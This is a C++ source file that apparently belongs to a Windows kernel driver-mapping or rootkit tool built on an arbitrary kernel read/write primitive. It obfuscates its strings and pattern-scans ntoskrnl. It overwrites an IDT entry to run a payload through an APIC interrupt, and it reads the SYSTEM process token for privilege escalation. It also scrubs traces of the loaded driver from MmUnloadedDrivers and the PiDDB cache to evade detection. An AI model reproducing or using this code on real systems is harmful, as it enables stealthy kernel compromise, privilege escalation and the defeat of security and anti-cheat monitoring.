
namespace exports
{
	void memcpy( void* dst, void* src, std::uint64_t size ) {
		static void* memcpy = nullptr;
		if ( !memcpy ) {
			memcpy = reinterpret_cast< void* >(
				modules::get_export(
					encrypt( "ntoskrnl.exe" ),
					encrypt( "memcpy" )
				) );
		}

		g_kernel->invoke( memcpy, dst, src, size );
	}

	pte* get_pte_address( std::uint64_t address ) {
		static void* mi_get_pte_address = nullptr;
		if ( !mi_get_pte_address ) {
			mi_get_pte_address = reinterpret_cast< void* >(
				modules::find_pattern(
					encrypt( "ntoskrnl.exe" ),
					encrypt( "48 C1 E9 ? 48 B8 ? ? ? ? ? ? ? ? 48 23 C8 48 B8 ? ? ? ? ? ? ? ? 48 03 C1" )
				) );
		}

		return g_kernel->invoke<pte*>( mi_get_pte_address, address );
	}

	void* ps_lookup_process_by_pid( std::uint32_t process_id ) {
		static void* fn_ps_lookup_process_by_pid = nullptr;
		if ( !fn_ps_lookup_process_by_pid ) {
			fn_ps_lookup_process_by_pid = reinterpret_cast< void* >(
				modules::get_export(
					encrypt( "ntoskrnl.exe" ),
					encrypt( "PsLookupProcessByProcessId" )
				)
				);
		}

		void* process = nullptr;
		auto status = g_kernel->invoke<NTSTATUS>(
			fn_ps_lookup_process_by_pid,
			reinterpret_cast<HANDLE>(process_id),
			&process
		);

		if ( !NT_SUCCESS( status ) ) {
			logging::print( encrypt( "Failed to lookup process with %d" ) , status );
			return nullptr;
		}

		return process;
	}

	bool ex_acquire_resource( void* resource, bool wait ) {
		static void* acquire_func = nullptr;
		if ( !acquire_func ) {
			acquire_func = reinterpret_cast< void* >(
				modules::get_export(
				encrypt( "ntoskrnl.exe" ),
				encrypt( "ExAcquireResourceExclusiveLite" )
				)
				);
		}

		return g_kernel->invoke<bool>( acquire_func, resource, wait );
	}

	void* lookup_element_table( void* table, void* buffer ) {
		static void* lookup_func = nullptr;
		if ( !lookup_func ) {
			lookup_func = reinterpret_cast< void* >(
				modules::get_export(
				encrypt( "ntoskrnl.exe" ),
				encrypt( "RtlLookupElementGenericTableAvl" )
				)
				);
		}

		return g_kernel->invoke<void*>( lookup_func, table, buffer );
	}

	void release_resource( void* resource ) {
		static void* release_func = nullptr;
		if ( !release_func ) {
			release_func = reinterpret_cast< void* >(
				modules::get_export(
				encrypt( "ntoskrnl.exe" ),
				encrypt( "ExReleaseResourceLite" )
				)
				);
		}

		g_kernel->invoke( release_func, resource );
	}

	bool delete_table_entry( void* table, void* buffer ) {
		static void* delete_func = nullptr;
		if ( !delete_func ) {
			delete_func = reinterpret_cast< void* >(
				modules::get_export(
				encrypt( "ntoskrnl.exe" ),
				encrypt( "RtlDeleteElementGenericTableAvl" )
				)
				);
		}

		return g_kernel->invoke<bool>( delete_func, table, buffer );
	}

	bool rtl_equal_unicode_string( UNICODE_STRING* str1, UNICODE_STRING* str2, bool case_insensitive ) {
		static void* equal_func = nullptr;
		if ( !equal_func ) {
			equal_func = reinterpret_cast< void* >(
				modules::get_export(
				encrypt( "ntoskrnl.exe" ),
				encrypt( "RtlEqualUnicodeString" )
				)
				);
		}

		return g_kernel->invoke<bool>( equal_func, str1, str2, case_insensitive );
	}

	void* ex_allocate_pool( std::size_t size ) {
		static void* fn_ex_allocate_pool = nullptr;
		if ( !fn_ex_allocate_pool ) {
			fn_ex_allocate_pool = reinterpret_cast< void* >(
				modules::get_export(
					encrypt( "ntoskrnl.exe" ),
					encrypt( "ExAllocatePool" )
				) );
		}

		return g_kernel->invoke<void*>( fn_ex_allocate_pool, 0, size );
	}

	void* mm_allocate_contiguous_memory( std::size_t size, physical_address_t highest_acceptable_address ) {
		static void* fn_mm_allocate_contiguous_memory = nullptr;
		if ( !fn_mm_allocate_contiguous_memory ) {
			fn_mm_allocate_contiguous_memory = reinterpret_cast< void* >(
				modules::get_export(
				encrypt( "ntoskrnl.exe" ),
				encrypt( "MmAllocateContiguousMemory" )
				) );
		}

		return g_kernel->invoke<void*>( fn_mm_allocate_contiguous_memory, size, highest_acceptable_address );
	}

	void* mm_get_virtual_for_physical( physical_address_t physical_address ) {
		static void* fn_mm_get_virtual_for_physical = nullptr;
		if ( !fn_mm_get_virtual_for_physical ) {
			fn_mm_get_virtual_for_physical = reinterpret_cast< void* >(
				modules::get_export(
				encrypt( "ntoskrnl.exe" ),
				encrypt( "MmGetVirtualForPhysical" )
				) );
		}

		return g_kernel->invoke<void*>( fn_mm_get_virtual_for_physical, physical_address );
	}

	physical_address_t mm_get_physical_address( void* virtual_address ) {
		static void* fn_mm_get_physical_address = nullptr;
		if ( !fn_mm_get_physical_address ) {
			fn_mm_get_physical_address = reinterpret_cast< void* >(
				modules::get_export(
				encrypt( "ntoskrnl.exe" ),
				encrypt( "MmGetPhysicalAddress" )
				) );
		}

		physical_address_t result{};
		result.m_quad_part = g_kernel->invoke<std::uint64_t>( fn_mm_get_physical_address, virtual_address );
		return result;
	}

	std::uint64_t read_msr( std::uint32_t msr_index ) {
		static void* fn_halp_whea_native_read_ssr = nullptr;
		if ( !fn_halp_whea_native_read_ssr ) {
			fn_halp_whea_native_read_ssr = reinterpret_cast< void* >(
				modules::find_pattern(
				encrypt( "ntoskrnl.exe" ),
				encrypt( "8B CA 0F 32 48 C1 E2 ? 48 0B C2 C3" )
				) );
		}

		return g_kernel->invoke<std::uint64_t>( fn_halp_whea_native_read_ssr, 0, msr_index );
	}

	void* ke_get_current_processor( ) {
		static void* fn_ke_get_current_processor = nullptr;
		if ( !fn_ke_get_current_processor ) {
			fn_ke_get_current_processor = reinterpret_cast< void* >(
				modules::get_export(
				encrypt( "ntoskrnl.exe" ),
				encrypt( "KeGetCurrentProcessorNumberEx" )
				) );
		}

		return g_kernel->invoke<void*>( fn_ke_get_current_processor, nullptr );
	}

	NTSTATUS ke_set_target_processor_dpc( void* dpc, void* processor_number ) {
		static void* fn_ke_set_target_processor_dpc = nullptr;
		if ( !fn_ke_set_target_processor_dpc ) {
			fn_ke_set_target_processor_dpc = reinterpret_cast< void* >(
				modules::get_export(
				encrypt( "ntoskrnl.exe" ),
				encrypt( "KeSetTargetProcessorDpcEx" )
				) );
		}

		return g_kernel->invoke<NTSTATUS>( fn_ke_set_target_processor_dpc, dpc, processor_number );
	}

	void* ke_insert_queue_dpc( void* dpc, void* system_arg1, void* system_arg2 ) {
		static void* fn_ke_insert_queue_dpc = nullptr;
		if ( !fn_ke_insert_queue_dpc ) {
			fn_ke_insert_queue_dpc = reinterpret_cast< void* >(
				modules::get_export(
				encrypt( "ntoskrnl.exe" ),
				encrypt( "KeInsertQueueDpc" )
				) );
		}

		return g_kernel->invoke<void*>( fn_ke_insert_queue_dpc, dpc, system_arg1, system_arg2 );
	}

	void* ke_initialize_dpc( void* dpc, void* routine, void* context ) {
		static void* fn_ke_initialize_dpc = nullptr;
		if ( !fn_ke_initialize_dpc ) {
			fn_ke_initialize_dpc = reinterpret_cast< void* >(
				modules::get_export(
				encrypt( "ntoskrnl.exe" ),
				encrypt( "KeInitializeDpc" )
				) );
		}

		return g_kernel->invoke<void*>( fn_ke_initialize_dpc, dpc, routine, context );
	}

	std::uint32_t ke_query_max_processor_count( ) {
		static void* fn_ke_query_max_processor_count = nullptr;
		if ( !fn_ke_query_max_processor_count ) {
			fn_ke_query_max_processor_count = reinterpret_cast< void* >(
				modules::get_export(
				encrypt( "ntoskrnl.exe" ),
				encrypt( "KeQueryMaximumProcessorCountEx" )
				) );
		}

		return g_kernel->invoke<std::uint32_t>( fn_ke_query_max_processor_count, 0 );
	}


	KAFFINITY ke_query_active_processors( ) {
		static void* fn_ke_query_active_processors = nullptr;
		if ( !fn_ke_query_active_processors ) {
			fn_ke_query_active_processors = reinterpret_cast< void* >(
				modules::get_export(
				encrypt( "ntoskrnl.exe" ),
				encrypt( "KeQueryActiveProcessors" )
				)
				);
		}

		return g_kernel->invoke<KAFFINITY>( fn_ke_query_active_processors );
	}

	std::uint64_t get_kprcb( int processor ) {
		static void* fn_ke_get_prcb = nullptr;
		if ( !fn_ke_get_prcb ) {
			fn_ke_get_prcb = reinterpret_cast< void* >(
				modules::find_pattern(
				encrypt( "ntoskrnl.exe" ),
				encrypt( "8B 05 ? ? ? ? 3B C8 73 ? 8B C1" )
				) );
		}

		return g_kernel->invoke<std::uint64_t>( fn_ke_get_prcb, processor );
	}

	std::uint64_t get_current_kprcb( ) {
		static void* fn_ke_get_current_prcb = nullptr;
		if ( !fn_ke_get_current_prcb ) {
			fn_ke_get_current_prcb = reinterpret_cast< void* >(
				modules::get_export(
				encrypt( "ntoskrnl.exe" ),
				encrypt( "KeGetCurrentPrcb" )
				)
				);
		}

		return g_kernel->invoke<std::uint64_t>( fn_ke_get_current_prcb );
	}

	std::uint64_t query_system_information( int information_class, void* buffer, std::uint32_t buffer_size, std::uint32_t* return_length ) {
		static void* fn_zw_query_system_information = nullptr;
		if ( !fn_zw_query_system_information ) {
			fn_zw_query_system_information = reinterpret_cast< void* >(
				modules::get_export(
				encrypt( "ntoskrnl.exe" ),
				encrypt( "ZwQuerySystemInformation" )
				)
				);
		}

		return g_kernel->invoke<NTSTATUS>(
			fn_zw_query_system_information,
			information_class,
			buffer,
			buffer_size,
			return_length
		);
	}

	void* allocate_system_memory( std::size_t size ) {
		static void* fn_ex_allocate_pool_with_tag = nullptr;
		if ( !fn_ex_allocate_pool_with_tag ) {
			fn_ex_allocate_pool_with_tag = reinterpret_cast< void* >(
				modules::get_export(
				encrypt( "ntoskrnl.exe" ),
				encrypt( "ExAllocatePool" )
				)
				);
		}

		return g_kernel->invoke<void*>( fn_ex_allocate_pool_with_tag, 0, size );
	}

	void free_system_memory( void* memory ) {
		static void* fn_ex_free_pool_with_tag = nullptr;
		if ( !fn_ex_free_pool_with_tag ) {
			fn_ex_free_pool_with_tag = reinterpret_cast< void* >(
				modules::get_export(
				encrypt( "ntoskrnl.exe" ),
				encrypt( "ExFreePool" )
				)
				);
		}

		g_kernel->invoke<void*>( fn_ex_free_pool_with_tag, memory );
	}
	std::pair< std::uint8_t*, std::uint8_t* > get_gdt_idt( ) {
		static void* fn_ki_get_gdt_idt = nullptr;
		if ( !fn_ki_get_gdt_idt ) {
			fn_ki_get_gdt_idt = reinterpret_cast< void* >(
				modules::find_pattern(
				encrypt( "ntoskrnl.exe" ),
				encrypt( "0F 01 01 0F 01 0A" )
				) );
		}

		uint8_t gdt_info[ 10 ];
		uint8_t idt_info[ 10 ];
		g_kernel->invoke<void*>( fn_ki_get_gdt_idt, &gdt_info, &idt_info );
		return std::make_pair( gdt_info, idt_info );
	}

	bool execute_hardware_interrupt( std::uint64_t payload_addr ) {
		logging::print( encrypt( "Triggering interrupt via APIC" ) );

		auto apic_base = read_msr( 0x1B );
		if ( !apic_base ) return false;

		logging::print( encrypt( "APIC base at: 0x%llx" ), apic_base );
		std::getchar( );

		apic_icr icr = { 0 };
		icr.m_fields.m_vector = 0x81;
		icr.m_fields.m_delivery_mode = 0;
		icr.m_fields.m_destination_mode = 0;
		icr.m_fields.m_level = 1;
		icr.m_fields.m_trigger_mode = 0;
		icr.m_fields.m_destination_shorthand = 1;
		icr.m_fields.m_destination = 0xFF;

		auto [gdt_info, idt_info] = get_gdt_idt( );
		auto idt_base = g_kernel->read_va<std::uintptr_t>( ( &idt_info[ 2 ] ) );
		logging::print( encrypt( "IDT base at: 0x%llx" ), idt_base );

		auto idt_entry = idt_base + ( 0x81 * sizeof( idt_entry_t ) );
		auto original_entry = g_kernel->read_va<idt_entry_t>( idt_entry );
		logging::print( encrypt( "Found IDT entry at: 0x%llx, index=%i" ), original_entry, 0x81 );

		idt_entry_t new_entry = { 0 };
		new_entry.m_offset_low = payload_addr & 0xFFFF;
		new_entry.m_offset_middle = ( payload_addr >> 16 ) & 0xFFFF;
		new_entry.m_offset_high = ( payload_addr >> 32 ) & 0xFFFFFFFF;
		new_entry.m_selector = 0x08;
		new_entry.m_attributes = 0x8E;

		logging::print( encrypt( "Writing IDT entry at 0x%llx to 0x%llx" ), idt_entry, new_entry );
		std::getchar( );

		g_kernel->write_va<idt_entry_t>( idt_entry, new_entry );

		g_kernel->write_va<std::uint64_t>( apic_base + 0x310, icr.m_raw );
		g_kernel->write_va<std::uint64_t>( apic_base + 0x300, icr.m_raw );

		logging::print( encrypt( "Restoring original IDT entry\n" ) );
		g_kernel->write_va<idt_entry_t>( idt_entry, original_entry );
		return true;
	}

	void* allocate_loaded_module( std::uint32_t module_size ) {
		logging::print( encrypt( "Allocating new loaded module" ) );

		auto ps_loaded_module_list_pattern = modules::find_pattern(
			encrypt( "ntoskrnl.exe" ),
			encrypt( "4C 8B 35 ? ? ? ? BA" )
		);

		if ( !ps_loaded_module_list_pattern ) {
			logging::print( encrypt( "Failed to find PsLoadedModuleList pattern" ) );
			return nullptr;
		}

		auto ps_loaded_module_list_rva = modules::rva(
			encrypt( "ntoskrnl.exe" ),
			ps_loaded_module_list_pattern,
			7
		);

		if ( !ps_loaded_module_list_rva ) {
			logging::print( encrypt( "Failed to resolve PsLoadedModuleList RVA" ) );
			return nullptr;
		}

		auto ps_loaded_module_list = g_kernel->read_va<list_entry_t>( ps_loaded_module_list_rva );
		if ( !ps_loaded_module_list.m_flink || !ps_loaded_module_list.m_blink ) {
			logging::print( encrypt( "Invalid PsLoadedModuleList pointers: flink=0x%llx, blink=0x%llx" ),
				ps_loaded_module_list.m_flink, ps_loaded_module_list.m_blink );
			return nullptr;
		}

		logging::print( encrypt( "PsLoadedModuleList: 0x%llx (flink=0x%llx, blink=0x%llx)" ),
			ps_loaded_module_list_rva, ps_loaded_module_list.m_flink, ps_loaded_module_list.m_blink );

		auto last_module_entry_ptr = CONTAINING_RECORD( ps_loaded_module_list.m_blink, kldr_data_table_entry_t, m_load_order_links );
		auto last_module_entry = g_kernel->read_va<kldr_data_table_entry_t>( last_module_entry_ptr );
		if ( !last_module_entry.m_dll_base ) {
			logging::print( encrypt( "Last module has invalid DLL base" ) );
			return nullptr;
		}

		auto physical_address = mm_get_physical_address( last_module_entry.m_dll_base );
		if ( !physical_address.m_quad_part ) {
			logging::print( encrypt( "Failed to get physical address for module base 0x%llx" ),
				last_module_entry.m_dll_base );
			return nullptr;
		}

		logging::print( encrypt( "Last loaded module: 0x%llx" ), last_module_entry_ptr );
		logging::print( encrypt( "Loaded module base: VA=0x%llx, PA=0x%llx" ), last_module_entry.m_dll_base, physical_address.m_quad_part );

		auto allocation_base = mm_allocate_contiguous_memory( module_size, physical_address );
		if ( !allocation_base ) {
			logging::print( encrypt( "Failed to allocate contiguous memory" ) );
			return nullptr;
		}

		auto alloc_phys_addr = mm_get_physical_address( allocation_base );
		logging::print( encrypt( "Allocated loaded module at: VA=0x%llx, PA: 0x%llx\n" ),
			allocation_base, alloc_phys_addr.m_quad_part );
		return allocation_base;
	}

	void* allocate_pool( std::size_t size ) {
		auto ex_allocate_pool = reinterpret_cast< void* >(
			modules::get_export(
				encrypt( "ntoskrnl.exe" ),
				encrypt( "ExAllocatePool" )
			) );
		if ( !ex_allocate_pool )
			return nullptr;

		auto allocation_base = g_kernel->invoke<void*>(
			ex_allocate_pool,
			0,
			size );
		if ( !allocation_base )
			return nullptr;

		return allocation_base;
	}

	void rtl_init_unicode_string( UNICODE_STRING* destination_string, const wchar_t* source_string ) {
		auto rtl_init_unicode_string_fn = reinterpret_cast< void* >(
			modules::get_export(
			encrypt( "ntoskrnl.exe" ),
			encrypt( "RtlInitUnicodeString" )
			) );
		if ( !rtl_init_unicode_string_fn )
			return;

		g_kernel->invoke<void*>(
			rtl_init_unicode_string_fn,
			destination_string,
			source_string );
	}

	bool execute_on_specific_core( std::uint32_t core_id, void* entry_point, void* context ) {
		logging::print( encrypt( "Queuing DPC execution on core: %d" ), core_id );

		auto dpc = allocate_pool( 0x40 );
		if ( !dpc ) {
			logging::print( encrypt( "Failed to allocate DPC structure" ) );
			return false;
		}

		auto processor_number = allocate_pool( 8 );
		if ( !processor_number ) {
			logging::print( encrypt( "Failed to allocate processor number structure" ) );
			return false;
		}

		logging::print( encrypt( "Processor number: %llx" ), processor_number );

		g_kernel->write_va<std::uint16_t>( reinterpret_cast< std::uint64_t >( processor_number ), 0 ); // Group = 0
		g_kernel->write_va<std::uint8_t>( reinterpret_cast< std::uint64_t >( processor_number ) + 2, core_id ); // Number = core_id
		g_kernel->write_va<std::uint8_t>( reinterpret_cast< std::uint64_t >( processor_number ) + 3, 0 ); // Reserved = 0

		ke_initialize_dpc( dpc, entry_point, context );

		auto result = ke_set_target_processor_dpc( dpc, processor_number );
		if ( result ) {
			logging::print( encrypt( "Failed to set target processor for DPC with: %x" ), result );
			return false;
		}

		if ( !ke_insert_queue_dpc( dpc, nullptr, nullptr ) ) {
			logging::print( encrypt( "Failed to insert DPC into queue" ) );
			return false;
		}

		logging::print( encrypt( "Successfully queued execution\n" ) );
		return true;
	}

	bool is_entry_empty( const mm_unloaded_drivers_t* entry ) {
		return entry->m_name.Length == 0 ||
			entry->m_name.Buffer == nullptr ||
			entry->m_unload_time == 0;
	}

	bool remove_unloaded_drivers( PWSTR driver_name ) {
		logging::print( encrypt( "Removing MmUnloadedDrivers entry" ) );

		auto mm_unloaded_drivers = g_kernel->read_va<mm_unloaded_drivers_t*>(
			modules::rva(
			encrypt( "ntoskrnl.exe" ),
			modules::find_pattern(
			encrypt( "ntoskrnl.exe" ),
			encrypt( "4C 8B 0D ? ? ? ? 83 FE" )
		), 7 )
		);
		if ( !mm_unloaded_drivers )
			return false;

		auto mm_last_unloaded_driver = g_kernel->read_va<ULONG*>(
			modules::rva(
			encrypt( "ntoskrnl.exe" ),
			modules::find_pattern(
			encrypt( "ntoskrnl.exe" ),
			encrypt( "4C 8B 35 ? ? ? ? BA" )
		),7 ) );
		if ( !mm_last_unloaded_driver )
			return false;

		auto ps_loaded_module_resource = g_kernel->read_va<eresource_t*>(
			modules::rva(
			encrypt( "ntoskrnl.exe" ),
			modules::find_pattern(
			encrypt( "ntoskrnl.exe" ),
			encrypt( "48 8D 0D ? ? ? ? E8 ? ? ? ? F7 43" )
		),
			7
		)
		);
		if ( !ps_loaded_module_resource )
			return false;

		logging::print( encrypt( "MmUnloadedDrivers: 0x%llx" ), mm_unloaded_drivers );
		logging::print( encrypt( "MmLastUnloadedDrivers: 0x%llx" ), mm_last_unloaded_driver );
		logging::print( encrypt( "PsLoadedModuleResource: 0x%llx" ), ps_loaded_module_resource );

		if ( !ex_acquire_resource( ps_loaded_module_resource, true ) )
			return false;

		bool modified = false;
		bool filled = true;
		UNICODE_STRING driver_name_us = utility::make_unicode_string( driver_name );

		for ( ULONG i = 0; i < 50; i++ ) {
			auto current_entry = mm_unloaded_drivers_t{};
			exports::memcpy(
				&current_entry,
				&mm_unloaded_drivers[ i ],
				sizeof( mm_unloaded_drivers_t )
			);

			if ( is_entry_empty( &current_entry ) ) {
				filled = false;
				continue;
			}

			if ( modified ) {
				if ( i == 49 ) {
					mm_unloaded_drivers_t empty_entry{};
					exports::memcpy(
						&mm_unloaded_drivers[ i ],
						&empty_entry,
						sizeof( mm_unloaded_drivers_t )
					);
				}
			}
			else if ( rtl_equal_unicode_string( &driver_name_us, &current_entry.m_name, TRUE ) ) {
				mm_unloaded_drivers_t empty_entry{};
				exports::memcpy(
					&mm_unloaded_drivers[ i ],
					&empty_entry,
					sizeof( mm_unloaded_drivers_t )
				);

				auto last_unloaded = g_kernel->read_va<ULONG>( mm_last_unloaded_driver );
				last_unloaded = ( filled ? 50 : last_unloaded ) - 1;
				g_kernel->write_va( mm_last_unloaded_driver, last_unloaded );

				modified = true;
			}
		}

		if ( modified ) {
			std::uint64_t previous_time = 0;

			for ( LONG i = 48; i >= 0; --i ) {
				auto current_entry = mm_unloaded_drivers_t{};
				exports::memcpy(
					&current_entry,
					&mm_unloaded_drivers[ i ],
					sizeof( mm_unloaded_drivers_t )
				);

				if ( is_entry_empty( &current_entry ) )
					continue;

				if ( previous_time != 0 && current_entry.m_unload_time > previous_time ) {
					current_entry.m_unload_time = previous_time - 100;
					exports::memcpy(
						&mm_unloaded_drivers[ i ],
						&current_entry,
						sizeof( mm_unloaded_drivers_t )
					);
				}

				previous_time = current_entry.m_unload_time;
			}
		}

		release_resource( ps_loaded_module_resource );
		return modified;
	}

	std::uint32_t find_least_active_core( ) {
		auto processor_count = ke_query_max_processor_count( );
		if ( processor_count == 0 )
			return 0;
		struct core_activity_t {
			std::uint64_t m_prcb;
			std::uint32_t m_core_id;
			std::uint64_t m_dpc_count;
			std::uint64_t m_interrupt_count;
			std::uint64_t m_idle_time;
			double m_activity_score;
		};

		auto activity_data = reinterpret_cast< core_activity_t* >(
			allocate_system_memory( sizeof( core_activity_t ) * processor_count )
			);

		if ( !activity_data ) {
			logging::print( encrypt( "Failed to allocate memory for core activity data" ) );
			return processor_count - 1;
		}

		const int SystemProcessorPerformanceInformation = 8;
		const int SYSTEM_PROCESSOR_PERFORMANCE_INFO_SIZE = 48;
		auto perf_info = allocate_system_memory( SYSTEM_PROCESSOR_PERFORMANCE_INFO_SIZE * processor_count );
		if ( perf_info ) {
			std::uint32_t return_length = 0;
			auto status = query_system_information(
				SystemProcessorPerformanceInformation,
				perf_info,
				SYSTEM_PROCESSOR_PERFORMANCE_INFO_SIZE * processor_count,
				&return_length
			);

			if ( NT_SUCCESS( status ) ) {
				for ( auto i = 0; i < processor_count; i++ ) {
					auto perf_base = reinterpret_cast< std::uint64_t >( perf_info ) +
						( i * SYSTEM_PROCESSOR_PERFORMANCE_INFO_SIZE );

					auto idle_time = g_kernel->read_va<std::uint64_t>( perf_base + 0 );

					auto activity_base = reinterpret_cast< std::uint64_t >( activity_data ) +
						( i * sizeof( core_activity_t ) );

					g_kernel->write_va<std::uint32_t>(
						activity_base + offsetof( core_activity_t, m_core_id ),
						i
					);

					g_kernel->write_va<std::uint64_t>(
						activity_base + offsetof( core_activity_t, m_idle_time ),
						idle_time
					);
				}
			}

			free_system_memory( perf_info );
		}

		for ( auto i = 0; i < processor_count; i++ ) {
			auto prcb = get_kprcb( i );
			if ( prcb ) {
				auto dpc_count = g_kernel->read_va<std::uint64_t>( prcb + 0x21E0 );
				auto interrupt_count = g_kernel->read_va<std::uint64_t>( prcb + 0x2290 );

				auto activity_base = reinterpret_cast< std::uint64_t >( activity_data ) +
					( i * sizeof( core_activity_t ) );

				g_kernel->write_va<std::uint64_t>(
					activity_base + offsetof( core_activity_t, m_prcb ),
					prcb
				);

				g_kernel->write_va<std::uint64_t>(
					activity_base + offsetof( core_activity_t, m_dpc_count ),
					dpc_count
				);

				g_kernel->write_va<std::uint64_t>(
					activity_base + offsetof( core_activity_t, m_interrupt_count ),
					interrupt_count
				);
			}
			else {
				logging::print( encrypt( "Failed to get PRCB for core %d" ), i );
			}
		}

		std::vector<core_activity_t> local_activity_data( processor_count );
		for ( auto i = 0; i < processor_count; i++ ) {
			auto activity_base = reinterpret_cast< std::uint64_t >( activity_data ) +
				( i * sizeof( core_activity_t ) );

			local_activity_data[ i ].m_core_id = g_kernel->read_va<std::uint32_t>(
				activity_base + offsetof( core_activity_t, m_core_id )
			);

			local_activity_data[ i ].m_prcb = g_kernel->read_va<std::uint64_t>(
				activity_base + offsetof( core_activity_t, m_prcb )
			);

			local_activity_data[ i ].m_dpc_count = g_kernel->read_va<std::uint64_t>(
				activity_base + offsetof( core_activity_t, m_dpc_count )
			);

			local_activity_data[ i ].m_interrupt_count = g_kernel->read_va<std::uint64_t>(
				activity_base + offsetof( core_activity_t, m_interrupt_count )
			);

			local_activity_data[ i ].m_idle_time = g_kernel->read_va<std::uint64_t>(
				activity_base + offsetof( core_activity_t, m_idle_time )
			);

			local_activity_data[ i ].m_activity_score =
				( local_activity_data[ i ].m_dpc_count * 0.4 ) +
				( local_activity_data[ i ].m_interrupt_count * 0.4 ) -
				( local_activity_data[ i ].m_idle_time * 0.2 );

			g_kernel->write_va<double>(
				activity_base + offsetof( core_activity_t, m_activity_score ),
				local_activity_data[ i ].m_activity_score
			);
		}

		core_activity_t best_core = local_activity_data[ 0 ];
		auto best_score = local_activity_data[ 0 ].m_activity_score;
		for ( auto i = 1; i < processor_count; i++ ) {
			auto& local_activity = local_activity_data[ i ];
			if ( local_activity.m_activity_score < best_score ) {
				best_score = local_activity.m_activity_score;
				best_core = local_activity;
			}
		}

		logging::print( encrypt( "System has %d cores, targeting core %d" ), processor_count, best_core.m_core_id );
		logging::print( encrypt( "Core %d: PRCB=0x%llx, DPC=%llu, Interrupt=%llu\n" ),
			best_core.m_core_id, best_core.m_prcb, best_core.m_dpc_count, best_core.m_interrupt_count );

		free_system_memory( activity_data );
		return best_core.m_core_id;
	}

	std::pair<std::uintptr_t, std::uintptr_t> resolve_token_offset( ) {
		std::uintptr_t token_offset = 0;
		std::uintptr_t system_token = 0;

		constexpr uintptr_t PID_OFFSET = 0x440;
		constexpr uintptr_t TOKEN_OFFSET = 0x4B8;

		const auto ps_initial_system_process =
			modules::get_export( encrypt( "ntoskrnl.exe" ), encrypt( "PsInitialSystemProcess" ) );

		const auto system_eprocess =
			g_kernel->read_va<std::uintptr_t>( ps_initial_system_process );

		if ( g_kernel->read_va<std::uintptr_t>( system_eprocess + PID_OFFSET ) != 4 ) {
			logging::print( encrypt( "SYSTEM process validation failed!" ) );
			return { 0, 0 };
		}

		token_offset = TOKEN_OFFSET;
		system_token = g_kernel->read_va<std::uintptr_t>( system_eprocess + token_offset );

		if ( ( system_token & 0xF ) == 0 ) {
			logging::print( encrypt( "Invalid SYSTEM token structure!" ) );
			return { 0, 0 };
		}

		return { token_offset, system_token };
	}

	bool remove_piddb_cache( PWSTR driver_name, std::uint32_t timestamp ) {
		logging::print( encrypt( "Removing PiDDB cache entry" ) );

		auto piddb_cache_table = reinterpret_cast<avl_table_t*>(
			modules::rva_lea(
				encrypt( "ntoskrnl.exe" ),
				modules::find_pattern(
				encrypt( "ntoskrnl.exe" ),
				encrypt( "48 8D 0D ? ? ? ? 45 33 F6 48 89 44 24" ) ), 7 ) );
		if ( !piddb_cache_table )
			return false;

		auto piddb_lock = reinterpret_cast<eresource_t*>(
			modules::rva_lea( 
			encrypt( "ntoskrnl.exe" ),
			modules::find_pattern(
			encrypt( "ntoskrnl.exe" ),
			encrypt( "48 8D 0D ? ? ? ? E8 ? ? ? ? 4C 8B 8C 24" ) ), 7 ) );
		if ( !piddb_lock )
			return false;

		avl_table_t piddb_table;
		exports::memcpy(
			&piddb_table,
			piddb_cache_table,
			sizeof( avl_table_t )
		);

		logging::print( encrypt( "PiDDBCacheTable: 0x%llx" ), piddb_cache_table );
		logging::print( encrypt( "PiDDBLock: 0x%llx" ), piddb_lock );
		//logging::print( encrypt( "PiDDB Elements=%d, Tree depth=%d\n" ),
		//	piddb_table.m_table_elements, piddb_table.m_tree_depth );

		piddb_cache_entry_t piddb_entry{};
		piddb_entry.m_timestamp = timestamp;
		rtl_init_unicode_string( &piddb_entry.m_driver_name, driver_name );

		if ( !ex_acquire_resource( piddb_lock, true ) )
			return false;

		auto cache_entry = reinterpret_cast< piddb_cache_entry_t* > (
			lookup_element_table( piddb_cache_table, &piddb_entry )
			);
		if ( !cache_entry ) {
			release_resource( piddb_lock );
			return false;
		}

		exports::memcpy(
			&piddb_entry,
			&cache_entry,
			sizeof( piddb_cache_entry_t )
		);

		list_entry_t next_entry{ };
		exports::memcpy(
			&next_entry,
			&piddb_entry.m_list.m_flink,
			sizeof( list_entry_t )
		);

		list_entry_t previous_entry{ };
		exports::memcpy(
			&previous_entry,
			&piddb_entry.m_list.m_blink,
			sizeof( list_entry_t )
		);

		previous_entry.m_flink = piddb_entry.m_list.m_flink;
		previous_entry.m_blink = piddb_entry.m_list.m_blink;

		exports::memcpy(
			&piddb_entry.m_list.m_blink,
			&previous_entry,
			sizeof( list_entry_t )
		);

		exports::memcpy(
			&piddb_entry.m_list.m_flink,
			&next_entry,
			sizeof( list_entry_t )
		);

		delete_table_entry( piddb_cache_table, cache_entry );
		piddb_table.m_delete_count--;

		piddb_cache_entry_t old_piddb_entry{};
		old_piddb_entry.m_driver_name = utility::make_unicode_string( driver_name );
		old_piddb_entry.m_timestamp = timestamp;
		auto result = lookup_element_table( piddb_cache_table, &old_piddb_entry );

		logging::print( encrypt( "Successfully removed PiDDB cache entry\n" ) );
		release_resource( piddb_lock );
		return result == nullptr;
	}
}